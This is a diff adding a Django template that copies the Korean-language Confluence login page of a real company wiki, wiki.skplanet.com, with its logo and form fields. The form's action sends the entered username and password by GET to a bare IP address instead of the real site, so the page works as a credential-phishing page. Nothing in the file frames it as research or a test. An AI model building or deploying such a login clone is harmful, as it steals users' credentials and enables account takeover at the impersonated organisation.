@@ -1,0 +1,79 @@
+{% extends 'base.html'%}
+
+{% block content %}
+{% load static %}
+
+<body id="com-atlassian-confluence" class=" rw_version_6 login aui-layout aui-theme-default" data-aui-version="9.2.2">
+
+        
+    <div id="stp-licenseStatus-banner"></div>
+    <div id="page">
+    <div id="full-height-container">
+        <div id="header-precursor">
+            <div class="cell">
+                
+                                </div>
+        </div>
+                <div id="rw_announcement_banners"></div>
+
+        <div id="rw_wrapper" class="rw_menu_layout_v2 rw_background_top rw_header_theme_1row rw_header_height_tighter rw_category_menu_theme_traditional rw_content_spaces_gray1 rw_content_menu_solid ">
+
+            <div id="rw_main">
+
+                <div class="rw_login_logo">
+                    <a href="https://wiki.skplanet.com/homepage.action">
+                        <img alt="" aria-label="Home page logo &#39;" src="https://wiki.skplanet.com/s/-ajrdci/8804/47zayh/_/images/logo/confluence-logo.png">
+                    </a>
+                </div>
+
+                <div id="main" class="aui-page-panel">
+                    
+        <div id="login-container">
+                    <div class="login-section ">
+                                                                                                                                                                
+    <form name="loginform" method="GET" action="http://3.37.52.97/account/dologin.action/" class="aui login-form-container">
+        {% csrf_token %}
+                                                                                                    
+        <h2>로그인</h2>
+                    
+<div id="action-messages">
+                        </div>
+                    <fieldset class="compact-form-fields">
+                            
+
+    <legend class="assistive"><span>Confluence에 로그인</span></legend>
+                        
+
+<div class="field-group
+    ">
+    <label id="os_username-label" for="os_username">
+        사용자 이름
+    </label>
+                <input type="text" name="os_username" id="os_username" class="text" placeholder="사용자 이름" data-focus="0">
+</div>                        
+
+<div class="field-group">
+    <label id="os_password-label" for="os_password">
+        비밀번호
+    </label>
+    <input type="password" name="os_password" id="os_password" class="password " placeholder="비밀 번호">
+</div>                      
+                  
+<div class="group">        
+<div class="checkbox" resolved="">
+    <input type="checkbox" class="checkbox" value="true" name="os_cookie" id="os_cookie" resolved=""><span class="aui-form-glyph"></span>
+    <label for="os_cookie">내 컴퓨터에 로그인 정보 기록하기</label>
+    </div>
+</div>                                                <div class="field-group form-buttons compact-form-buttons ">
+        <input id="loginButton" class="aui-button aui-style aui-button-primary" name="login" type="submit" value="로그인" resolved="">
+                                                    </div>
+        <input type="hidden" name="os_destination" value="/index.action">
+</fieldset>                                 
+
+</form>                
+</div> 
+</div>                        
+</div>
+
+
+{% endblock  %}
